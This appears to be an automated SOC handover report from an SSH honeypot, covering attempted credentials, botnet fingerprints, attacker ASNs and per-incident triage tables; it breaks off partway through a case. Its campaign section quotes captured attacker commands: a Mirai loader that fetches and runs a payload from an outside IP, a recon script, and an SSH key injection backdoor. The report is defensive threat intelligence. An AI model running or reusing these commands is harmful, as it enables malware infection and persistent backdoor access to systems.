# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-20 |
| **Generated At** | 2026-08-20T18:44:46Z |
| **Shift Time** | 18:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **153** |
| Confirmed Threats | **133** |
| False Positives Filtered | **20** (13.1%) |
| Unique Attacker IPs | **72** |
| Countries of Origin | **28** |
| High Severity Cases | **72** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **81** |
| Malware Samples Analyzed | **3** HIGH · **21** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **94** |
| Unique Credential Pairs | **51** |
| Unique Usernames | **15** |
| Unique Passwords | **49** |
| Successful Auth Pairs | **85** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 29 |
| `ubuntu` | 13 |
| `nobody` | 8 |
| `support` | 8 |
| `config` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `config2013` | 6 |
| `support2025` | 6 |
| `root2015` | 6 |
| `nobody2013` | 5 |
| `user2004` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `config` | `config2013` | 6 |
| `support` | `support2025` | 6 |
| `root` | `root2015` | 6 |
| `nobody` | `nobody2013` | 5 |
| `user` | `user2004` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `nobody` | `nobody2013` | `10.0.0.73` | 2026-08-20T14:55:57 |
| `Administrator` | `admin` | `45.154.244.193` | 2026-08-20T14:56:14 |
| `nobody` | `nobody2013` | `203.252.10.4` | 2026-08-20T14:57:37 |
| `ubuntu` | `online2024` | `217.60.255.130` | 2026-08-20T14:58:23 |
| `ubnt` | `ubnt2016` | `10.0.0.73` | 2026-08-20T15:00:40 |
| `root` | `11111` | `217.60.255.130` | 2026-08-20T15:00:53 |
| `user` | `user2004` | `10.0.0.73` | 2026-08-20T15:08:49 |
| `ubuntu` | `adm!n@2003` | `217.60.255.130` | 2026-08-20T15:09:24 |
| `root` | `12345` | `217.60.255.130` | 2026-08-20T15:11:38 |
| `root` | `debian` | `116.255.215.168` | 2026-08-20T15:11:51 |
| `nobody` | `nobody2013` | `62.182.118.138` | 2026-08-20T15:13:41 |
| `nobody` | `nobody2013` | `111.171.125.94` | 2026-08-20T15:13:50 |
| `ubnt` | `ubnt2016` | `35.130.111.98` | 2026-08-20T15:17:37 |
| `ubnt` | `ubnt2016` | `175.43.162.214` | 2026-08-20T15:17:53 |
| `ubuntu` | `zxcv@1234` | `217.60.255.130` | 2026-08-20T15:20:11 |
| `root` | `13579` | `217.60.255.130` | 2026-08-20T15:22:18 |
| `user` | `user2004` | `61.12.84.172` | 2026-08-20T15:26:55 |
| `user` | `user2004` | `59.120.8.61` | 2026-08-20T15:27:08 |
| `user` | `user2004` | `34.41.211.48` | 2026-08-20T15:27:21 |
| `mahesh` | `mahesh` | `207.154.247.140` | 2026-08-20T15:27:59 |
| `345gs5662d34` | `345gs5662d34` | `207.154.247.140` | 2026-08-20T15:28:01 |
| `mahesh` | `3245gs5662d34` | `207.154.247.140` | 2026-08-20T15:28:02 |
| `ubuntu` | `Aa123` | `217.60.255.130` | 2026-08-20T15:31:09 |
| `unknown` | `unknown2007` | `182.60.128.241` | 2026-08-20T15:31:20 |
| `unknown` | `unknown2007` | `95.35.29.192` | 2026-08-20T15:31:28 |
| `root` | `54321` | `217.60.255.130` | 2026-08-20T15:33:08 |
| `nobody` | `nobody2003` | `10.0.0.73` | 2026-08-20T15:34:10 |
| `ubuntu` | `root123456` | `152.32.212.226` | 2026-08-20T15:34:15 |
| `345gs5662d34` | `345gs5662d34` | `152.32.212.226` | 2026-08-20T15:34:18 |
| `ubuntu` | `3245gs5662d34` | `152.32.212.226` | 2026-08-20T15:34:20 |
| `Administrator` | `admin` | `10.0.0.73` | 2026-08-20T15:39:43 |
| `ubuntu` | `Mahmoud12345` | `217.60.255.130` | 2026-08-20T15:41:52 |
| `config` | `config2013` | `10.0.0.73` | 2026-08-20T15:42:09 |
| `root` | `100000` | `217.60.255.130` | 2026-08-20T15:43:42 |
| `root` | `admin` | `85.11.167.121` | 2026-08-20T15:47:23 |
| `unknown` | `unknown2007` | `156.238.86.2` | 2026-08-20T15:47:31 |
| `unknown` | `unknown2007` | `221.182.185.190` | 2026-08-20T15:47:41 |
| `nobody` | `nobody2003` | `192.34.128.202` | 2026-08-20T15:51:18 |
| `nobody` | `nobody2003` | `222.186.68.153` | 2026-08-20T15:51:29 |
| `ubuntu` | `Test2024` | `217.60.255.130` | 2026-08-20T15:52:37 |
| `root` | `102030` | `217.60.255.130` | 2026-08-20T15:54:17 |
| `admin` | `admin2003` | `60.166.31.198` | 2026-08-20T15:56:29 |
| `config` | `config2013` | `24.142.170.231` | 2026-08-20T16:00:22 |
| `config` | `config2013` | `218.21.246.238` | 2026-08-20T16:00:33 |
| `config` | `config2013` | `65.20.251.170` | 2026-08-20T16:00:40 |
| `config` | `config2013` | `200.89.159.59` | 2026-08-20T16:00:53 |
| `ubuntu` | `!QAZ1qaz!QAZ` | `217.60.255.130` | 2026-08-20T16:03:17 |
| `support` | `support2025` | `10.0.0.73` | 2026-08-20T16:03:33 |
| `root` | `111111` | `217.60.255.130` | 2026-08-20T16:04:45 |
| `support` | `support2025` | `65.20.133.56` | 2026-08-20T16:05:09 |
| `support` | `support2025` | `14.97.77.182` | 2026-08-20T16:05:17 |
| `admin` | `admin2003` | `10.0.0.73` | 2026-08-20T16:07:59 |
| `support` | `support` | `176.53.159.196` | 2026-08-20T16:12:49 |
| `ubuntu` | `@dmin@dmin` | `217.60.255.130` | 2026-08-20T16:14:02 |
| `root` | `112023` | `217.60.255.130` | 2026-08-20T16:15:31 |
| `root` | `root2015` | `10.0.0.73` | 2026-08-20T16:15:54 |
| `support` | `support2025` | `59.93.36.136` | 2026-08-20T16:21:11 |
| `support` | `support2025` | `31.173.8.170` | 2026-08-20T16:21:20 |
| `ubuntu` | `ASDasd123` | `217.60.255.130` | 2026-08-20T16:24:44 |
| `admin` | `admin2003` | `45.178.227.0` | 2026-08-20T16:24:56 |
| `root` | `112233` | `217.60.255.130` | 2026-08-20T16:25:58 |
| `supervisor` | `supervisor2016` | `218.4.156.254` | 2026-08-20T16:30:17 |
| `root` | `root2015` | `61.169.54.150` | 2026-08-20T16:34:11 |
| `root` | `root2015` | `218.21.250.151` | 2026-08-20T16:34:20 |
| `root` | `root2015` | `211.23.109.116` | 2026-08-20T16:34:24 |
| `root` | `root2015` | `101.13.4.124` | 2026-08-20T16:34:34 |
| `ubuntu` | `password` | `217.60.255.130` | 2026-08-20T16:35:25 |
| `root` | `114477` | `217.60.255.130` | 2026-08-20T16:36:35 |
| `debian` | `debian2010` | `10.0.0.73` | 2026-08-20T16:37:24 |
| `support` | `support` | `10.0.0.73` | 2026-08-20T16:37:36 |
| `debian` | `debian2010` | `122.187.229.220` | 2026-08-20T16:38:48 |
| `debian` | `debian2010` | `211.178.165.251` | 2026-08-20T16:39:01 |
| `root` | `1` | `195.178.110.217` | 2026-08-20T16:41:32 |
| `supervisor` | `supervisor2016` | `10.0.0.73` | 2026-08-20T16:41:42 |
| `root` | `12` | `195.178.110.217` | 2026-08-20T16:43:05 |
| `root` | `123` | `195.178.110.217` | 2026-08-20T16:44:43 |
| `ubuntu` | `!QAZ2wsx#EDC` | `217.60.255.130` | 2026-08-20T16:46:04 |
| `root` | `1234` | `195.178.110.217` | 2026-08-20T16:46:28 |
| `root` | `121212` | `217.60.255.130` | 2026-08-20T16:47:09 |
| `root` | `admin` | `45.198.224.26` | 2026-08-20T16:48:01 |
| `root` | `12345` | `195.178.110.217` | 2026-08-20T16:48:12 |
| `blank` | `blank2022` | `10.0.0.73` | 2026-08-20T16:49:38 |
| `root` | `1234567` | `195.178.110.217` | 2026-08-20T16:51:41 |
| `root` | `12345678` | `195.178.110.217` | 2026-08-20T16:53:23 |
| `root` | `123456789` | `195.178.110.217` | 2026-08-20T16:54:58 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **153** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 36 |
| OpenSSH | 31 |
| Go SSH scanner | 13 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 31 | 31 |
| `419da4c91ddb...` | Modern SSH client | 22 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 9 | 1 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `14b2ddda386a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 31 | 31 | Mirai/variant |
| `419da4c91ddb...` | libssh | 22 | 1 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 9 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `14b2ddda386a...` | libssh | 1 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Recon Loader Script** | 🟡 MEDIUM | 8 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `45.198.224.26`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.217`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `152.32.212.226`, `207.154.247.140`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **72** |
| Unique ASNs | **55** |
| High-Risk ASNs | **47** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS3301` | Telia Company AB | 3 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS9829` | National Internet Backbone | 2 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 2 | HIGH |
| `AS3462` | Data Communication Business Group | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (72)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b4ffcbbe2889

| Field | Detail |
|---|---|
| **Source IP** | `45.154.244[.]193` |
| **First Seen** | 2026-08-20 14:56 |
| **Last Seen** | 2026-08-20 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 14:56:13` | `cowrie.session.connect` |
| `2026-08-20 14:56:13` | `cowrie.client.version` |
| `2026-08-20 14:56:13` | `cowrie.client.kex` |
| `2026-08-20 14:56:14` | `cowrie.login.success` |
| `2026-08-20 14:56:14` | `cowrie.direct-tcpip.request` |
| `2026-08-20 14:56:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 14:56:14` | `cowrie.direct-tcpip.data` |
| `2026-08-20 14:56:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.154.244[.]193` to AbuseIPDB if not already reported
- [ ] Block `45.154.244[.]193` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d11aa277b87d

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]4` |
| **First Seen** | 2026-08-20 14:57 |
| **Last Seen** | 2026-08-20 14:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 14:57:34` | `cowrie.session.connect` |
| `2026-08-20 14:57:35` | `cowrie.client.version` |
| `2026-08-20 14:57:35` | `cowrie.client.kex` |
| `2026-08-20 14:57:37` | `cowrie.login.success` |
| `2026-08-20 14:57:38` | `cowrie.direct-tcpip.request` |
| `2026-08-20 14:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e47bdb4d835

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 14:58 |
| **Last Seen** | 2026-08-20 14:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 14:58:22` | `cowrie.session.connect` |
| `2026-08-20 14:58:22` | `cowrie.client.version` |
| `2026-08-20 14:58:22` | `cowrie.client.kex` |
| `2026-08-20 14:58:23` | `cowrie.login.success` |
| `2026-08-20 14:58:24` | `cowrie.direct-tcpip.request` |
| `2026-08-20 14:58:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 14:58:25` | `cowrie.direct-tcpip.data` |
| `2026-08-20 14:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b2cf4b91c27

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 15:00 |
| **Last Seen** | 2026-08-20 15:01 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:00:49` | `cowrie.session.connect` |
| `2026-08-20 15:00:49` | `cowrie.client.version` |
| `2026-08-20 15:00:51` | `cowrie.client.kex` |
| `2026-08-20 15:00:53` | `cowrie.login.success` |
| `2026-08-20 15:01:19` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7f634cadd99

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 15:09 |
| **Last Seen** | 2026-08-20 15:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:09:20` | `cowrie.session.connect` |
| `2026-08-20 15:09:20` | `cowrie.client.version` |
| `2026-08-20 15:09:21` | `cowrie.client.kex` |
| `2026-08-20 15:09:24` | `cowrie.login.success` |
| `2026-08-20 15:09:24` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:09:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 15:09:30` | `cowrie.direct-tcpip.data` |
| `2026-08-20 15:09:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ea8ff05d947

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 15:11 |
| **Last Seen** | 2026-08-20 15:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:11:34` | `cowrie.session.connect` |
| `2026-08-20 15:11:35` | `cowrie.client.version` |
| `2026-08-20 15:11:35` | `cowrie.client.kex` |
| `2026-08-20 15:11:38` | `cowrie.login.success` |
| `2026-08-20 15:11:39` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:11:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 15:11:39` | `cowrie.direct-tcpip.data` |
| `2026-08-20 15:11:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b9c0b278691

| Field | Detail |
|---|---|
| **Source IP** | `116.255.215[.]168` |
| **First Seen** | 2026-08-20 15:11 |
| **Last Seen** | 2026-08-20 15:16 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:11:50` | `cowrie.session.connect` |
| `2026-08-20 15:11:50` | `cowrie.client.version` |
| `2026-08-20 15:11:50` | `cowrie.client.kex` |
| `2026-08-20 15:11:51` | `cowrie.login.success` |
| `2026-08-20 15:16:51` | `cowrie.session.file_upload` |
| `2026-08-20 15:16:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.255.215[.]168` to AbuseIPDB if not already reported
- [ ] Block `116.255.215[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-921ab9acdbcb

| Field | Detail |
|---|---|
| **Source IP** | `62.182.118[.]138` |
| **First Seen** | 2026-08-20 15:13 |
| **Last Seen** | 2026-08-20 15:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:13:39` | `cowrie.session.connect` |
| `2026-08-20 15:13:40` | `cowrie.client.version` |
| `2026-08-20 15:13:40` | `cowrie.client.kex` |
| `2026-08-20 15:13:41` | `cowrie.login.success` |
| `2026-08-20 15:13:41` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:13:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.182.118[.]138` to AbuseIPDB if not already reported
- [ ] Block `62.182.118[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c98e0de51ac

| Field | Detail |
|---|---|
| **Source IP** | `111.171.125[.]94` |
| **First Seen** | 2026-08-20 15:13 |
| **Last Seen** | 2026-08-20 15:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:13:47` | `cowrie.session.connect` |
| `2026-08-20 15:13:47` | `cowrie.client.version` |
| `2026-08-20 15:13:47` | `cowrie.client.kex` |
| `2026-08-20 15:13:50` | `cowrie.login.success` |
| `2026-08-20 15:13:51` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:13:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.125[.]94` to AbuseIPDB if not already reported
- [ ] Block `111.171.125[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be64b74aea23

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]98` |
| **First Seen** | 2026-08-20 15:17 |
| **Last Seen** | 2026-08-20 15:22 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:17:36` | `cowrie.session.connect` |
| `2026-08-20 15:17:36` | `cowrie.client.version` |
| `2026-08-20 15:17:36` | `cowrie.client.kex` |
| `2026-08-20 15:17:37` | `cowrie.login.success` |
| `2026-08-20 15:17:38` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:22:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]98` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d7580bc1336

| Field | Detail |
|---|---|
| **Source IP** | `175.43.162[.]214` |
| **First Seen** | 2026-08-20 15:17 |
| **Last Seen** | 2026-08-20 15:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:17:49` | `cowrie.session.connect` |
| `2026-08-20 15:17:50` | `cowrie.client.version` |
| `2026-08-20 15:17:50` | `cowrie.client.kex` |
| `2026-08-20 15:17:53` | `cowrie.login.success` |
| `2026-08-20 15:17:54` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.43.162[.]214` to AbuseIPDB if not already reported
- [ ] Block `175.43.162[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-104dac2b036f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 15:20 |
| **Last Seen** | 2026-08-20 15:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:20:09` | `cowrie.session.connect` |
| `2026-08-20 15:20:09` | `cowrie.client.version` |
| `2026-08-20 15:20:09` | `cowrie.client.kex` |
| `2026-08-20 15:20:11` | `cowrie.login.success` |
| `2026-08-20 15:20:12` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:20:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 15:20:12` | `cowrie.direct-tcpip.data` |
| `2026-08-20 15:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69c59f52b02b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 15:22 |
| **Last Seen** | 2026-08-20 15:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:22:14` | `cowrie.session.connect` |
| `2026-08-20 15:22:14` | `cowrie.client.version` |
| `2026-08-20 15:22:15` | `cowrie.client.kex` |
| `2026-08-20 15:22:18` | `cowrie.login.success` |
| `2026-08-20 15:22:20` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:22:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 15:22:21` | `cowrie.direct-tcpip.data` |
| `2026-08-20 15:22:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d67660feff12

| Field | Detail |
|---|---|
| **Source IP** | `61.12.84[.]172` |
| **First Seen** | 2026-08-20 15:26 |
